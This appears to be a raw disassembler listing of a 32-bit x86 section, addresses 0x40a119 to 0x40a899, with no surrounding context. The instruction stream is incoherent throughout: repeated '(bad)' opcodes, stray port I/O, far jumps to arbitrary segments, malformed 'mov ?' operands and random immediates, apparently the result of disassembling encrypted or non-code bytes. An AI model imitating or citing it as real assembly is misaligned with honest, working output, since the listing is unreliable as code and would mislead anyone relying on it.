  40a119:	stos   BYTE PTR es:[edi],al
  40a11a:	mov    dl,0x94
  40a11c:	cld    
  40a11d:	shl    DWORD PTR [edx],1
  40a11f:	cmp    eax,0x3dade0bb
  40a124:	or     bh,BYTE PTR [ecx+eiz*1-0x7996d70c]
  40a12b:	mov    al,ds:0xf729c881
  40a130:	aad    0x1c
  40a132:	and    BYTE PTR [edi+ebx*1-0x4d2c06a],al
  40a139:	or     DWORD PTR [esi+eiz*2+0x39],ebp
  40a13d:	fstp   st(0)
  40a13f:	fld    DWORD PTR [ecx+0x6e69f4dc]
  40a145:	mov    DWORD PTR [edi+eax*4],esp
  40a148:	out    dx,al
  40a149:	xchg   edi,eax
  40a14a:	aaa    
  40a14b:	dec    esp
  40a14c:	sub    BYTE PTR [edi],0x12
  40a14f:	jle    0x40a15d
  40a151:	jae    0x40a0f4
  40a153:	dec    esi
  40a154:	xor    edx,DWORD PTR [esp+edx*4]
  40a157:	imul   ecx,DWORD PTR [ebx+ebx*1],0xb33b8dc2
  40a15e:	push   cs
  40a15f:	xchg   ecx,eax
  40a160:	lock adc BYTE PTR [ebp-0x12],bh
  40a164:	mov    BYTE PTR [eax+esi*8-0x509613a4],cl
  40a16b:	and    eax,0x76032a55
  40a170:	ins    DWORD PTR es:[edi],dx
  40a171:	cli    
  40a172:	pop    eax
  40a173:	push   ebx
  40a174:	popf   
  40a175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a176:	mov    ah,0x21
  40a178:	mov    ebx,DWORD PTR [edi+0x369a9077]
  40a17e:	add    eax,0x2d78ef8f
  40a183:	fidiv  WORD PTR [esi+0x7024456f]
  40a189:	push   eax
  40a18a:	jae    0x40a1c2
  40a18c:	(bad)  
  40a18d:	mov    dh,0x51
  40a18f:	mov    edx,0xb966a23b
  40a194:	enter  0xb08a,0x2c
  40a198:	sti    
  40a199:	adc    bl,ah
  40a19b:	or     BYTE PTR [ecx+0x4c1ca4bf],al
  40a1a1:	dec    ebp
  40a1a2:	in     al,dx
  40a1a3:	xchg   ebx,eax
  40a1a4:	mov    edx,0x7def920d
  40a1a9:	arpl   WORD PTR [edx+0x11f8294d],bp
  40a1af:	fadd   QWORD PTR [ebx+0x17]
  40a1b2:	ret    0xcbc3
  40a1b5:	jge    0x40a172
  40a1b7:	jmp    0xebf1:0x4ca3d3ee
  40a1be:	adc    eax,0x798fc1ad
  40a1c3:	mov    al,0x17
  40a1c5:	sbb    al,0xd3
  40a1c7:	das    
  40a1c8:	sub    edi,DWORD PTR [esi]
  40a1ca:	scas   eax,DWORD PTR es:[edi]
  40a1cb:	push   eax
  40a1cc:	jmp    0xd736:0x6dacba66
  40a1d3:	jle    0x40a1e9
  40a1d5:	xchg   ebx,eax
  40a1d6:	lock dec eax
  40a1d8:	vmovdqa XMMWORD PTR [ebp+0x4dcabdcb],xmm4
  40a1e0:	cmp    dl,BYTE PTR [ecx+0x522f1195]
  40a1e6:	inc    ebx
  40a1e7:	cld    
  40a1e8:	clc    
  40a1e9:	or     al,0x6b
  40a1eb:	jb     0x40a1e4
  40a1ed:	push   esp
  40a1ee:	ja     0x40a247
  40a1f0:	outs   dx,BYTE PTR ds:[esi]
  40a1f1:	mov    eax,ds:0xd98101c0
  40a1f6:	cmp    BYTE PTR [edx],al
  40a1f8:	(bad)  
  40a1f9:	cmp    DWORD PTR [ebx+0x21],ecx
  40a1fc:	pop    ebx
  40a1fd:	ficom  DWORD PTR ds:0xa1f49a1c
  40a203:	cmp    ecx,0x6f
  40a206:	push   es
  40a207:	or     esi,edx
  40a209:	add    eax,DWORD PTR [edi]
  40a20b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a20c:	jmp    FWORD PTR [edx+0x78]
  40a20f:	dec    esi
  40a210:	clc    
  40a211:	cmc    
  40a212:	cdq    
  40a213:	bndldx (bad),[ebx]
  40a216:	fstp   DWORD PTR ds:0x17fac8d
  40a21c:	cli    
  40a21d:	inc    eax
  40a21e:	add    eax,0xbcac558b
  40a223:	push   ss
  40a224:	and    edx,esi
  40a226:	cli    
  40a227:	and    al,0x70
  40a229:	int3   
  40a22a:	cmp    al,0x3f
  40a22d:	or     dl,dh
  40a22f:	hlt    
  40a230:	dec    BYTE PTR [esi]
  40a232:	xor    cl,BYTE PTR [eax-0x4720281b]
  40a238:	sub    al,0x33
  40a23a:	fimul  DWORD PTR [eax-0x31a67886]
  40a240:	jno    0x40a2aa
  40a242:	push   esp
  40a243:	add    DWORD PTR [eax],ebp
  40a245:	mov    ebx,0xc6949636
  40a24a:	clc    
  40a24b:	loopne 0x40a1ff
  40a24d:	call   0x2b44:0x61c37911
  40a254:	js     0x40a283
  40a256:	push   edx
  40a257:	aas    
  40a258:	jne    0x40a1f3
  40a25a:	mov    eax,0x8201f67d
  40a25f:	mov    ?,WORD PTR [esi]
  40a261:	inc    eax
  40a262:	jp     0x40a211
  40a264:	(bad)  
  40a265:	mov    cl,BYTE PTR cs:[ebp-0x23]
  40a269:	sbb    BYTE PTR [esi+esi*4-0x2f05c8b2],al
  40a270:	frstor [ecx+0x44]
  40a273:	and    BYTE PTR [ebx],0xd
  40a276:	sub    dl,BYTE PTR [ecx+0x2575e87e]
  40a27c:	(bad)
  40a27f:	jge    0x40a2b5
  40a281:	mov    cs,ecx
  40a283:	call   0x6994:0x8cff9996
  40a28a:	or     DWORD PTR [ebx-0x69f1a74b],edx
  40a290:	sub    cl,ch
  40a292:	mov    ebp,0xf71d70d2
  40a297:	outs   dx,BYTE PTR ds:[esi]
  40a298:	pop    DWORD PTR [esi+0x2abe28d1]
  40a29e:	push   ebx
  40a29f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2a0:	and    BYTE PTR [edi+0x206753c0],bl
  40a2a6:	movd   mm4,esp
  40a2a9:	into   
  40a2aa:	or     al,0xe0
  40a2ac:	push   0xdfe9f5d
  40a2b1:	sahf   
  40a2b2:	xlat   BYTE PTR ds:[ebx]
  40a2b3:	xor    DWORD PTR [edi],ebx
  40a2b5:	inc    edi
  40a2b6:	jge    0x40a31b
  40a2b8:	adc    bh,dh
  40a2ba:	stos   DWORD PTR es:[edi],eax
  40a2bb:	mov    eax,ds:0xb2d1a554
  40a2c0:	push   edi
  40a2c1:	cmp    al,BYTE PTR [esi-0x1b0d5802]
  40a2c7:	cmp    esi,esp
  40a2c9:	mov    al,ds:0x58918fba
  40a2ce:	stos   DWORD PTR es:[edi],eax
  40a2cf:	hlt    
  40a2d0:	and    al,0x5
  40a2d2:	in     eax,dx
  40a2d3:	js     0x40a346
  40a2d5:	leave  
  40a2d6:	jo     0x40a2c5
  40a2d8:	adc    edi,DWORD PTR [esi]
  40a2da:	and    DWORD PTR [ebp-0x15ac060],ecx
  40a2e0:	pop    DWORD PTR [esi]
  40a2e2:	inc    esp
  40a2e3:	daa    
  40a2e4:	cmp    al,0x92
  40a2e6:	xchg   ebp,eax
  40a2e7:	(bad)  
  40a2e8:	push   edx
  40a2e9:	test   BYTE PTR [edi],ch
  40a2eb:	lods   eax,DWORD PTR ds:[esi]
  40a2ec:	xchg   ebp,eax
  40a2ed:	xor    al,0x22
  40a2ef:	xchg   edi,eax
  40a2f0:	sub    DWORD PTR ds:0x50e7b740,esi
  40a2f6:	mov    ebx,0x3b73ed6b
  40a2fb:	call   0x2274aa6f
  40a300:	xor    al,0xea
  40a302:	lea    esi,[ebx-0x32]
  40a305:	(bad)  
  40a306:	pop    ss
  40a307:	mov    ecx,eax
  40a309:	inc    edi
  40a30a:	or     DWORD PTR [ecx],eax
  40a30c:	popa   
  40a30d:	mov    dl,0x5f
  40a30f:	mov    ?,WORD PTR [eax+0x5d7c778c]
  40a315:	mov    DWORD PTR [ecx-0x61],esp
  40a318:	inc    ecx
  40a319:	jle    0x40a34f
  40a31b:	rol    BYTE PTR gs:[ecx+0x49],0x8a
  40a320:	sbb    eax,0x49a65af0
  40a325:	stos   BYTE PTR es:[edi],al
  40a326:	mov    ds:0x1482bd25,eax
  40a32b:	adc    ecx,DWORD PTR [eax]
  40a32d:	push   ecx
  40a32e:	ror    cl,cl
  40a330:	push   cs
  40a331:	rcl    edi,1
  40a333:	inc    esi
  40a334:	xchg   BYTE PTR [edi-0x6dd2cce5],al
  40a33a:	data16 loope 0x40a38a
  40a33d:	pop    edx
  40a33e:	js     0x40a2f2
  40a340:	inc    ebx
  40a341:	mov    al,ds:0x4cc22f5a
  40a346:	dec    ebp
  40a347:	mov    al,0xa0
  40a349:	jp     0x40a332
  40a34b:	test   eax,0xbae19b29
  40a350:	sbb    eax,0x77f06ab1
  40a355:	in     al,0xae
  40a357:	xor    al,0xee
  40a359:	call   0x234bfbfe
  40a35e:	call   0x8590:0xc3d6786b
  40a365:	xor    al,0xab
  40a367:	add    bh,BYTE PTR [ecx+0x63cc460a]
  40a36d:	pop    ss
  40a36e:	dec    ebx
  40a36f:	pop    ecx
  40a370:	dec    ebx
  40a371:	and    DWORD PTR [edi],edi
  40a373:	ss in  al,dx
  40a375:	xchg   esi,eax
  40a376:	loope  0x40a2f9
  40a378:	push   ebx
  40a379:	and    esp,DWORD PTR [eax-0x68]
  40a37c:	push   ebx
  40a37d:	mov    ecx,0x6667f871
  40a382:	(bad)  
  40a383:	fwait
  40a384:	in     eax,0x0
  40a386:	ja     0x40a31c
  40a388:	cs xchg edi,eax
  40a38a:	cli    
  40a38b:	addr16 cmp ch,dl
  40a38e:	jecxz  0x40a3a1
  40a390:	push   esp
  40a391:	lea    eax,[ebx]
  40a393:	loope  0x40a39b
  40a395:	pop    esp
  40a396:	nop
  40a397:	sub    al,0x82
  40a399:	js     0x40a400
  40a39b:	push   ecx
  40a39c:	and    al,0x35
  40a39f:	or     BYTE PTR [esi],cl
  40a3a1:	in     al,dx
  40a3a2:	repz enter 0x536,0x92
  40a3a7:	lahf   
  40a3a8:	and    BYTE PTR [esp+edx*8-0x15],0x47
  40a3ad:	lahf   
  40a3ae:	retf   0x52be
  40a3b1:	stc    
  40a3b2:	int3   
  40a3b3:	cmp    al,0x41
  40a3b5:	inc    eax
  40a3b6:	sbb    ebx,DWORD PTR ds:0x5c19
  40a3bb:	imul   esi,DWORD PTR ds:0xe7cf0815,0x4ea84dc6
  40a3c5:	pop    esi
  40a3c6:	mov    gs,WORD PTR [edx+0x4903ede4]
  40a3cc:	push   ds
  40a3cd:	out    dx,eax
  40a3ce:	imul   ecx,DWORD PTR [edx+ebx*4-0x43ec2bd3],0x9d424631
  40a3d9:	sbb    eax,0xbdde2e1d
  40a3de:	into   
  40a3df:	loop   0x40a3b6
  40a3e1:	adc    dh,BYTE PTR [eax-0x7161b8e7]
  40a3e7:	pop    ecx
  40a3e8:	inc    ebp
  40a3e9:	dec    esp
  40a3ea:	inc    edx
  40a3eb:	sub    al,0x5e
  40a3ed:	and    BYTE PTR [edx+0x6eb6a404],bh
  40a3f3:	loopne 0x40a44d
  40a3f5:	rcr    BYTE PTR [ebx-0x76],1
  40a3f8:	cwde   
  40a3f9:	and    al,0x68
  40a3fb:	aad    0x76
  40a3fd:	mov    BYTE PTR [edi],0xe5
  40a400:	jae    0x40a44e
  40a402:	inc    esp
  40a403:	inc    ebp
  40a404:	es jmp 0x9bd9:0xe47e00ad
  40a40c:	les    esi,FWORD PTR [ecx-0x59]
  40a40f:	pop    esp
  40a410:	pop    esp
  40a411:	adc    dh,0xb1
  40a414:	int3   
  40a415:	imul   eax,DWORD PTR [ecx+0x27],0x87b74193
  40a41c:	(bad)  
  40a41d:	test   dh,0xd4
  40a420:	mov    ds:0x23d2621b,eax
  40a425:	xchg   edi,eax
  40a426:	mov    eax,0x946b2696
  40a42b:	xchg   ebp,eax
  40a42c:	cmp    BYTE PTR [ebx+ecx*4+0x51],ah
  40a430:	jge    0x40a417
  40a432:	outs   dx,BYTE PTR ds:[esi]
  40a433:	xor    al,0x66
  40a435:	pop    edi
  40a436:	adc    DWORD PTR [eax+0x4],0x11b3d342
  40a43d:	push   ds
  40a43e:	or     BYTE PTR [ebx+ebp*8],0x8e
  40a442:	and    edx,DWORD PTR [edi-0x7c]
  40a445:	es xchg ebx,eax
  40a447:	add    al,0x90
  40a449:	and    eax,0xf7adf150
  40a44e:	aas    
  40a44f:	retf   
  40a450:	mov    BYTE PTR [eax-0x155fd24c],bh
  40a456:	sbb    DWORD PTR [ecx+0x49],ecx
  40a459:	jecxz  0x40a3f3
  40a45b:	aam    0x6
  40a45d:	xor    ecx,DWORD PTR [edx-0x471a86bc]
  40a463:	cmc    
  40a464:	mov    esi,DWORD PTR [esi+0x9]
  40a467:	xchg   ebp,eax
  40a468:	and    al,0xf6
  40a46a:	xlat   BYTE PTR ds:[ebx]
  40a46b:	stos   DWORD PTR es:[edi],eax
  40a46c:	test   al,0xcb
  40a46e:	push   ds
  40a46f:	out    0xe9,al
  40a471:	push   edx
  40a472:	out    0xed,al
  40a474:	mov    gs,WORD PTR [edi-0xb]
  40a477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a478:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a479:	(bad)  
  40a47b:	nop
  40a47c:	int3   
  40a47d:	cwde   
  40a47e:	dec    esi
  40a47f:	add    ah,dl
  40a481:	pop    ds
  40a482:	xchg   edi,eax
  40a483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a484:	push   es
  40a485:	iret   
  40a486:	push   edx
  40a487:	bt     DWORD PTR cs:[edx],edx
  40a48b:	dec    eax
  40a48c:	lds    ecx,FWORD PTR [bp+si+0xb]
  40a490:	push   ss
  40a491:	in     al,0x3a
  40a493:	xor    DWORD PTR [ecx+0x4cb85fbc],eax
  40a499:	in     eax,0xb1
  40a49b:	enter  0xe42f,0xd0
  40a49f:	mov    ch,bl
  40a4a1:	bound  edi,QWORD PTR [ebx]
  40a4a3:	mov    cl,0xa6
  40a4a5:	(bad)  [ebp-0x60]
  40a4a8:	xchg   DWORD PTR [ecx+0x24],edx
  40a4ab:	xchg   BYTE PTR [ecx+eiz*8],bl
  40a4ae:	mov    cl,0xc
  40a4b0:	ret    
  40a4b1:	xor    dh,BYTE PTR [ecx+edi*4]
  40a4b4:	dec    ecx
  40a4b5:	in     eax,0xb1
  40a4b7:	adc    ecx,DWORD PTR [edx+0x25]
  40a4ba:	loopne 0x40a528
  40a4bc:	mov    esi,0xe31a7c46
  40a4c1:	mov    al,0xc5
  40a4c3:	imul   ecx,ebx,0xffffffc9
  40a4c6:	out    0x53,al
  40a4c8:	adc    dh,BYTE PTR [edi+0x4213a507]
  40a4ce:	mov    cl,0x4d
  40a4d0:	nop
  40a4d1:	aam    0x72
  40a4d3:	add    eax,0x4e140019
  40a4d8:	enter  0x826d,0x11
  40a4dc:	inc    edi
  40a4dd:	les    esp,FWORD PTR [edx+0x16]
  40a4e0:	repz repnz xor DWORD PTR [ecx],edi
  40a4e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4e5:	sti    
  40a4e6:	call   0x4b5a05cc
  40a4eb:	xlat   BYTE PTR ds:[ebx]
  40a4ec:	mov    ah,0x41
  40a4ee:	cmc    
  40a4ef:	xlat   BYTE PTR ds:[ebx]
  40a4f0:	sbb    al,dh
  40a4f2:	dec    esi
  40a4f3:	xor    DWORD PTR [edx+0x5676a005],0x20
  40a4fa:	data16 or al,0x61
  40a4fd:	sbb    eax,0x3f81cc2a
  40a502:	add    ah,dl
  40a504:	pop    es
  40a505:	xor    DWORD PTR [eax+0x1ece887f],esp
  40a50b:	clc    
  40a50c:	jle    0x40a53d
  40a50e:	aad    0xb3
  40a510:	not    al
  40a512:	mov    dl,BYTE PTR [edx+0x3e]
  40a515:	jne    0x40a4cb
  40a517:	or     DWORD PTR [ecx],0xea58b06c
  40a51d:	mov    DWORD PTR [edx+0x8d1a1fa],0x8dc0535
  40a527:	pop    esp
  40a528:	ret    0x3afb
  40a52b:	ror    BYTE PTR [eax+0x72],1
  40a52e:	ficom  WORD PTR [eax+0x3d938579]
  40a534:	inc    esi
  40a535:	xlat   BYTE PTR ds:[ebx]
  40a536:	ret    0xa222
  40a539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a53a:	ja     0x40a503
  40a53c:	adc    al,0x8d
  40a53e:	adc    DWORD PTR [ecx+0x6f],0x91083d43
  40a545:	rol    DWORD PTR [edi-0x68],cl
  40a548:	and    BYTE PTR [edi],dl
  40a54a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a54b:	rdmsr  
  40a54d:	fdiv   QWORD PTR [ecx+eiz*8-0x38c1fa7f]
  40a554:	ins    DWORD PTR es:[edi],dx
  40a555:	shl    dl,1
  40a557:	in     al,dx
  40a558:	inc    esi
  40a559:	jnp    0x40a53d
  40a55b:	ss pop esp
  40a55d:	int    0xe
  40a55f:	xor    DWORD PTR [edx-0x5a],0xffffffb4
  40a563:	mov    ds:0x3046077,eax
  40a568:	hlt    
  40a569:	mov    BYTE PTR [ecx-0x14e237ee],dh
  40a56f:	jecxz  0x40a5d1
  40a571:	or     dl,al
  40a573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a574:	mov    ebx,0x33bfa87f
  40a579:	jmp    0x1462a054
  40a57e:	mov    eax,ds:0xa666e626
  40a583:	xlat   BYTE PTR ds:[ebx]
  40a584:	pop    ss
  40a585:	add    DWORD PTR [edi],ebx
  40a587:	jne    0x40a580
  40a589:	pmaddwd mm3,QWORD PTR ds:0x5f4243d6
  40a590:	add    eax,0xb687d8a9
  40a595:	push   ecx
  40a596:	jne    0x40a5d6
  40a598:	mul    bh
  40a59a:	inc    edx
  40a59b:	push   edi
  40a59c:	fadd   st,st(5)
  40a59e:	adc    BYTE PTR [ecx-0x6c],dl
  40a5a1:	mov    esp,0xe446c809
  40a5a6:	jmp    0x5be18561
  40a5ab:	sbb    bl,BYTE PTR [edx]
  40a5ad:	cmp    DWORD PTR [edx],eax
  40a5af:	xlat   BYTE PTR ds:[ebx]
  40a5b0:	sbb    BYTE PTR [edi],dh
  40a5b2:	data16 fidivr DWORD PTR [ebx+0x7f08c718]
  40a5b9:	aam    0x81
  40a5bb:	cs popf 
  40a5bd:	mov    WORD PTR [edx+0x7b593649],gs
  40a5c3:	inc    DWORD PTR [edx-0x42]
  40a5c6:	std    
  40a5c7:	inc    esi
  40a5c8:	cld    
  40a5c9:	cmc    
  40a5ca:	mov    eax,ds:0x33b9accb
  40a5cf:	cmp    eax,0x568b07c4
  40a5d4:	add    bl,bh
  40a5d6:	int    0xc9
  40a5d8:	add    ch,BYTE PTR [ebx-0x68]
  40a5db:	mov    eax,ds:0xe81830c8
  40a5e0:	out    0x71,eax
  40a5e2:	fild   QWORD PTR [ecx]
  40a5e4:	fstp   TBYTE PTR [edx]
  40a5e6:	es push esp
  40a5e8:	fwait
  40a5e9:	stos   DWORD PTR es:[edi],eax
  40a5ea:	call   0xe9fef50e
  40a5ef:	inc    eax
  40a5f0:	stos   BYTE PTR es:[edi],al
  40a5f1:	push   eax
  40a5f2:	hlt    
  40a5f3:	shl    DWORD PTR [ecx+0xd],1
  40a5f6:	(bad)  
  40a5f7:	enter  0x635d,0xfb
  40a5fb:	dec    ecx
  40a5fc:	sbb    esp,esi
  40a5fe:	aad    0x9c
  40a600:	jp     0x40a66a
  40a602:	xchg   esp,eax
  40a603:	sub    bl,bl
  40a605:	inc    BYTE PTR [ebx+0x1f]
  40a608:	mov    cl,BYTE PTR [edx]
  40a60a:	cwde   
  40a60b:	mov    bh,0x89
  40a60d:	pop    ds
  40a60e:	retf   
  40a60f:	call   0x72f1ce7b
  40a614:	out    dx,al
  40a615:	stos   BYTE PTR es:[edi],al
  40a616:	gs dec edx
  40a618:	push   edx
  40a619:	cmp    BYTE PTR [esi+eiz*2-0x11],0x4e
  40a61e:	push   eax
  40a61f:	lahf   
  40a620:	fild   DWORD PTR [edi+0x50dad73c]
  40a626:	add    BYTE PTR [ebx-0x5],ah
  40a629:	js     0x40a614
  40a62b:	jp     0x40a5e0
  40a62d:	test   al,0x74
  40a62f:	jg     0x40a677
  40a631:	cmp    edx,DWORD PTR [ebx]
  40a633:	dec    ecx
  40a634:	rol    DWORD PTR [ebp+0x1],cl
  40a637:	pop    eax
  40a638:	ja     0x40a5f7
  40a63a:	sub    al,0x41
  40a63c:	jl     0x40a68e
  40a63e:	ds int3 
  40a640:	shl    dh,0x8a
  40a643:	or     al,0xe1
  40a645:	in     eax,dx
  40a646:	or     eax,0x39d7c7bd
  40a64b:	ja     0x40a5cf
  40a64d:	inc    edi
  40a64e:	add    cl,ah
  40a650:	xor    eax,0xfd2cc80
  40a655:	xor    BYTE PTR [ebp-0x38919389],ch
  40a65b:	fcomp  QWORD PTR [edi+0x40638f23]
  40a661:	and    al,0xcc
  40a663:	fmul   st(1),st
  40a665:	out    0xb3,eax
  40a667:	clc    
  40a668:	(bad)  
  40a669:	imul   esp,DWORD PTR [ebx-0x1aa25cba],0xffffff92
  40a670:	pop    ebx
  40a671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a672:	aaa    
  40a673:	add    al,0xf8
  40a675:	icebp  
  40a676:	aaa    
  40a677:	fs cwde 
  40a679:	mov    ebp,0x4466e938
  40a67e:	add    al,0x1c
  40a680:	push   eax
  40a681:	pop    ebp
  40a682:	xor    eax,0xbf16180d
  40a687:	out    dx,al
  40a688:	ins    BYTE PTR es:[edi],dx
  40a689:	bnd jmp 0x79054966
  40a68f:	inc    ebx
  40a690:	inc    edx
  40a691:	xor    DWORD PTR [edx-0x1f],esp
  40a694:	cmp    BYTE PTR [esi+esi*8],ah
  40a697:	sbb    BYTE PTR [edi],ch
  40a699:	jae    0x40a6c1
  40a69b:	das    
  40a69c:	and    BYTE PTR [ecx-0x6ceb2d6f],ah
  40a6a2:	xchg   edi,eax
  40a6a3:	and    eax,DWORD PTR [ebx]
  40a6a5:	(bad)  
  40a6a6:	enter  0x9c65,0x23
  40a6aa:	jne    0x40a6c1
  40a6ac:	stc    
  40a6ad:	int    0x9a
  40a6af:	pop    esi
  40a6b0:	retf   0xd32d
  40a6b3:	sahf   
  40a6b4:	xlat   BYTE PTR ds:[ebx]
  40a6b5:	mov    ebx,DWORD PTR [edx]
  40a6b7:	repnz sbb ebx,DWORD PTR [eax-0x3b]
  40a6bb:	je     0x40a6ca
  40a6bd:	(bad)  
  40a6be:	jmp    0x299b:0xede3b0a5
  40a6c5:	inc    ecx
  40a6c6:	pop    edx
  40a6c7:	fsub   DWORD PTR [ebx-0x6b]
  40a6ca:	xor    esp,DWORD PTR [ebx-0x2]
  40a6cd:	mov    ebx,0xfca7c0ec
  40a6d2:	popf   
  40a6d3:	xchg   ecx,eax
  40a6d4:	jge    0x40a747
  40a6d6:	sti    
  40a6d7:	mov    eax,ds:0x4c38dbe3
  40a6dc:	fstp   TBYTE PTR [ebp-0x2d]
  40a6df:	mov    ecx,0x3333986d
  40a6e4:	jns    0x40a6da
  40a6e6:	jmp    0x5505:0xaf8d50b1
  40a6ed:	add    DWORD PTR [ecx+0x6c],ecx
  40a6f0:	dec    ebx
  40a6f1:	in     al,dx
  40a6f2:	gs mov edx,ds
  40a6f5:	push   ebx
  40a6f6:	xchg   ebp,eax
  40a6f7:	mov    al,ds:0xac98c0a2
  40a6fc:	icebp  
  40a6fd:	adc    bl,BYTE PTR [ebx]
  40a6ff:	dec    eax
  40a700:	pop    esi
  40a701:	daa    
  40a702:	sub    ch,BYTE PTR [ebx]
  40a704:	push   ecx
  40a705:	not    bh
  40a707:	dec    ebp
  40a708:	sbb    BYTE PTR [edx+0x4f],ch
  40a70b:	shl    ah,0x68
  40a70e:	sub    eax,0x57e53faa
  40a713:	jle    0x40a71f
  40a715:	out    0x1f,eax
  40a717:	js     0x40a747
  40a719:	fwait
  40a71a:	int3   
  40a71b:	(bad)  
  40a71c:	div    DWORD PTR [eax]
  40a71e:	repnz ror esi,0xf4
  40a722:	push   ss
  40a723:	xchg   DWORD PTR [ecx+0x543d37f3],ecx
  40a729:	add    BYTE PTR [eax],ch
  40a72b:	sahf   
  40a72c:	and    al,0x8e
  40a72e:	fisub  DWORD PTR [esi+0x33d46fbc]
  40a734:	pusha  
  40a735:	loopne 0x40a76f
  40a737:	(bad)  
  40a739:	out    0x6f,eax
  40a73b:	mov    edx,0xdb96625c
  40a740:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a741:	lahf   
  40a742:	push   es
  40a743:	xor    al,0xba
  40a745:	sbb    ebp,esp
  40a747:	sub    esp,DWORD PTR ds:0xc3056ce3
  40a74d:	xlat   BYTE PTR ds:[ebx]
  40a74e:	lahf   
  40a74f:	inc    edi
  40a750:	sub    esp,ebp
  40a752:	cwde   
  40a753:	daa    
  40a754:	xchg   esp,esi
  40a756:	push   ecx
  40a757:	lock push ecx
  40a759:	sbb    al,ah
  40a75b:	repnz lea esi,[ebp-0x449c719b]
  40a762:	loop   0x40a6fb
  40a764:	sbb    bl,BYTE PTR [ebp+0x408ebf3d]
  40a76a:	mov    eax,ds:0x26e54343
  40a76f:	sbb    al,0xeb
  40a771:	call   0x5a4ffc38
  40a776:	mov    DWORD PTR [ecx],ecx
  40a778:	jle    0x40a7bc
  40a77a:	push   cs
  40a77b:	mov    cl,0xb4
  40a77d:	or     eax,DWORD PTR [esi+0x7b]
  40a780:	pop    es
  40a781:	mov    cl,0x54
  40a783:	ss jmp 0x40a71f
  40a786:	retf   
  40a787:	dec    ecx
  40a788:	fstp   TBYTE PTR [edx+ebx*4+0x6e]
  40a78c:	int3   
  40a78d:	push   cs
  40a78e:	popa   
  40a78f:	cmc    
  40a790:	adc    BYTE PTR [ecx],ch
  40a792:	push   ebp
  40a793:	xor    dh,BYTE PTR [edx]
  40a795:	adc    bh,BYTE PTR [edi]
  40a797:	mov    cl,al
  40a799:	fs push edx
  40a79b:	rol    esi,cl
  40a79d:	and    eax,0xfea34fbd
  40a7a2:	lock outs dx,DWORD PTR ds:[esi]
  40a7a4:	pop    ss
  40a7a5:	xor    eax,0xc7a2a804
  40a7aa:	enter  0x86e8,0x6f
  40a7ae:	out    0x57,al
  40a7b0:	lods   eax,DWORD PTR ds:[esi]
  40a7b1:	mov    esi,0x224b6c6e
  40a7b6:	sub    eax,0xf8bc352c
  40a7bb:	or     eax,0xba6c6921
  40a7c0:	jns    0x40a777
  40a7c2:	mov    edx,0x31faf0d2
  40a7c7:	loop   0x40a75d
  40a7c9:	cmp    dh,BYTE PTR [ecx-0x35871494]
  40a7cf:	dec    eax
  40a7d0:	lea    eax,cs:[eax-0x788f7651]
  40a7d7:	fcomp  QWORD PTR [edx]
  40a7d9:	pop    es
  40a7da:	add    bl,BYTE PTR [ebp+0x76]
  40a7dd:	fwait
  40a7de:	sbb    ax,0x7f2a
  40a7e2:	fmul   DWORD PTR [edx]
  40a7e4:	push   edx
  40a7e5:	popf   
  40a7e6:	ins    BYTE PTR es:[edi],dx
  40a7e7:	xchg   esp,eax
  40a7e8:	and    al,0x31
  40a7ea:	pop    esp
  40a7eb:	out    dx,al
  40a7ec:	clc    
  40a7ed:	rcl    DWORD PTR [eax+0x1c],1
  40a7f0:	dec    esp
  40a7f1:	in     eax,dx
  40a7f2:	jno    0x40a81a
  40a7f4:	and    BYTE PTR [ebx+0x6a7adb2],0x8e
  40a7fb:	pop    ecx
  40a7fc:	push   edx
  40a7fd:	sbb    ah,BYTE PTR [eax]
  40a7ff:	jl     0x40a828
  40a801:	fnstsw WORD PTR [ecx+0x4c]
  40a804:	jmp    0xcaaa4e4e
  40a809:	fisub  DWORD PTR [ecx]
  40a80b:	add    DWORD PTR [edi+0x4e],edi
  40a80e:	inc    esp
  40a80f:	pop    ss
  40a810:	rol    dh,cl
  40a812:	mov    eax,0x94330bc8
  40a817:	shl    al,cl
  40a819:	mov    esi,0x6727675d
  40a81e:	test   DWORD PTR [ecx],ecx
  40a820:	ja     0x40a7e9
  40a822:	pop    ebp
  40a823:	xor    al,bl
  40a825:	and    al,0xab
  40a827:	outs   dx,BYTE PTR ds:[esi]
  40a828:	pop    es
  40a829:	repz push ebp
  40a82b:	dec    edi
  40a82c:	ret    0x81c8
  40a82f:	inc    ebp
  40a830:	or     ebx,DWORD PTR [edx]
  40a832:	mov    edx,0x6d272839
  40a837:	fcom   DWORD PTR [esi-0x1f3002d7]
  40a83d:	and    DWORD PTR [ecx],ebp
  40a83f:	outs   dx,BYTE PTR ds:[esi]
  40a840:	push   es
  40a841:	dec    esp
  40a842:	fidivr WORD PTR [esi]
  40a844:	mov    esp,0xfb53f2cd
  40a849:	ja     0x40a893
  40a84b:	dec    eax
  40a84c:	call   0xfc4003ce
  40a851:	pop    edx
  40a852:	call   0x11cc850d
  40a857:	xor    al,0xa2
  40a859:	mov    DWORD PTR [esi],ecx
  40a85b:	imul   DWORD PTR [edx+0x2f]
  40a85e:	dec    ecx
  40a85f:	push   eax
  40a860:	fdiv   DWORD PTR [ebx]
  40a862:	test   ch,0xf1
  40a865:	loopne 0x40a8aa
  40a867:	sub    DWORD PTR [edx+0x3c],0x16
  40a86b:	dec    ecx
  40a86c:	enter  0xc2fe,0x25
  40a870:	pop    es
  40a871:	xchg   BYTE PTR [ebx+0x30cec7],ch
  40a877:	and    BYTE PTR [ecx-0x24],ch
  40a87a:	popa   
  40a87b:	dec    esi
  40a87c:	cmp    ebx,DWORD PTR [esi]
  40a87e:	into   
  40a87f:	push   es
  40a880:	mov    ds:0x8b265114,al
  40a885:	loopne 0x40a8cc
  40a887:	in     eax,dx
  40a888:	into   
  40a889:	mov    edi,0x64a4e387
  40a88e:	call   0xda0d:0x545447bf
  40a895:	cmp    al,0x5b
  40a897:	lock dec edx
  40a899:	adc    bl,cl
